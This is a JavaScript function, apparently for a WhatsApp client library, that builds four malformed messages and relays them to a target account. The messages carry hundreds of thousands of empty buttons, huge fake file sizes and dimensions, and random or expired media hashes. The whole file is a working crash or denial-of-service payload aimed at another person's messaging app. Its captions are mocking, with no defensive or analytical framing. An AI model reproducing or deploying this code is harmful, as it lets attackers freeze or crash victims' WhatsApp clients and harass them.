async function ComboxJ(sock, target) {
  const CodeA = generateWAMessageFromContent(target, {
   groupStatusMessageV2: {
     message: {
       interactiveMessage: {
         header: {
           imageMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
             mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: "9999",
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "HeksenJahat",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: { text: "— Heksen Jahat#" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, CodeA.message, {
    participant: { jid: target },
    messageId: CodeA.key.id
  });

  const CodeB = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "code.pdf",
            hasMediaAttachment: true,
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
              fileLength: "999999999",
              pageCount: 1000,
              mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
              fileName: "billy.pdf",
              fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
              directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1779839963",
              thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
              thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
              thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
              jpegThumbnail: null,
              contextInfo: {},
              thumbnailHeight: 999,
              thumbnailWidth: 999
            }
          },
          body: { text: "Heksen#/." },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, CodeB.message, {
    participant: { jid: target },
    messageId: CodeB.key.id
  });

  const Pemanis = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
        title: "Kok lu ganteng sih bill😩"
      },
      body: {
        text: "crott 😹"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      },
      contextInfo: {
        mentionedJid: [target],
        forwardingScore: 9898989,
        isForwarded: true
      }
    }
  }, {});

  await sock.relayMessage(target, Pemanis.message, {
    participant: { jid: target },
    messageId: Pemanis.key.id
  });

  const CodeX = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileLength: 9999999999999,
              height: 99999,
              width: 99999,
              mediaKey: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
              directPath: "/m1/v/t24/00002299291718920200291920729100",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
              caption: "nani desuka?",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: { text: "— Heksen - Jahat#" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const CodeCrypto = generateWAMessageFromContent(target, CodeX, {});
  await sock.relayMessage(target, CodeCrypto.message, {
    participant: { jid: target },
    messageId: CodeCrypto.key.id
  });
}